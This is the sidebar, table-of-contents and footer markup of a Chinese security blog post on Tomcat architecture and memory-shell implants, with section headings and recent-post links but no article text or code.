var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Jackson反序列化</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">n4c1</div><div class="author-info__description">hello,world</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">Tomcat 架构原理 &amp; Tomcat内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E5%99%A8%E7%BB%93%E6%9E%84"><span class="toc-number">1.0.1.</span> <span class="toc-text">连接器结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ProtocolHandler"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">ProtocolHandler</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#EndPoint"><span class="toc-number">1.0.1.1.1.</span> <span class="toc-text">EndPoint</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Proccessor"><span class="toc-number">1.0.1.1.2.</span> <span class="toc-text">Proccessor</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Adapter"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">Adapter</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E5%AE%B9%E5%99%A8%E7%BB%93%E6%9E%84"><span class="toc-number">1.0.2.</span> <span class="toc-text">Servlet容器结构</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Lifecycle-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">1.0.2.0.1.</span> <span class="toc-text">Lifecycle 生命周期</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.3.</span> <span class="toc-text">Tomcat启动流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#init%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">init流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#start%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">start流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95"><span class="toc-number">1.0.3.3.</span> <span class="toc-text">源码调试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#servlet"><span class="toc-number">1.0.4.</span> <span class="toc-text">servlet</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#servlet%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">servlet初始化流程分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#servlet%E8%A3%85%E8%BD%BD%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">servlet装载流程分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter"><span class="toc-number">1.0.5.</span> <span class="toc-text">Filter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95"><span class="toc-number">1.0.5.1.</span> <span class="toc-text">tomcat源码调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%A6%82%E4%BD%95%E5%88%B0%E8%BE%BEFilter"><span class="toc-number">1.0.5.2.</span> <span class="toc-text">请求如何到达Filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Filter%E5%AE%B9%E5%99%A8%E4%B8%8EFilterDefs%E3%80%81FilterConfigs%E3%80%81FilterMaps%E3%80%81FilterChain"><span class="toc-number">1.0.5.3.</span> <span class="toc-text">Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FilterChain%E5%88%9B%E5%BB%BA"><span class="toc-number">1.0.5.4.</span> <span class="toc-text">FilterChain创建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0"><span class="toc-number">1.0.5.5.</span> <span class="toc-text">内存马构造</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-StandardContext%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.0.5.5.1.</span> <span class="toc-text">获取 StandardContext对象</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%80%9A%E8%BF%87lastServicedRequest"><span class="toc-number">1.0.5.5.1.1.</span> <span class="toc-text">通过lastServicedRequest</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Thread"><span class="toc-number">1.0.5.5.1.2.</span> <span class="toc-text">通过Thread</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%80%E7%BB%88exp"><span class="toc-number">1.0.5.5.2.</span> <span class="toc-text">最终exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Listener"><span class="toc-number">1.0.6.</span> <span class="toc-text">Listener</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95-1"><span class="toc-number">1.0.6.1.</span> <span class="toc-text">源码调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Listener%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0"><span class="toc-number">1.0.6.2.</span> <span class="toc-text">Listener内存马构造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/15/sekaictf-2025-hqli-me/" title="sekaictf 2025 hqli-me">sekaictf 2025 hqli-me</a><time datetime="2025-09-15T09:00:10.000Z" title="发表于 2025-09-15 17:00:10">2025-09-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="SnakeYaml反序列化">SnakeYaml反序列化</a><time datetime="2025-09-10T07:37:58.000Z" title="发表于 2025-09-10 15:37:58">2025-09-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/10/c3p0%E5%88%A9%E7%94%A8/" title="c3p0利用">c3p0利用</a><time datetime="2025-09-10T06:55:56.000Z" title="发表于 2025-09-10 14:55:56">2025-09-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Fastjson反序列化">Fastjson反序列化</a><time datetime="2025-09-10T06:46:57.000Z" title="发表于 2025-09-10 14:46:57">2025-09-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/10/Spring%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Spring%E5%86%85%E5%AD%98%E9%A9%AC/" title="Spring架构原理 &amp; Spring内存马">Spring架构原理 &amp; Spring内存马</a><time datetime="2025-09-10T06:40:14.000Z" title="发表于 2025-09-10 14:40:14">2025-09-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By n4c1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="Java,Python,PHP,Node,Golang,C#,Tomcat,Apache,SqlInjection,SSTI,LFI,XSS,Nmap,BurpSuite,Hack,Docker" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>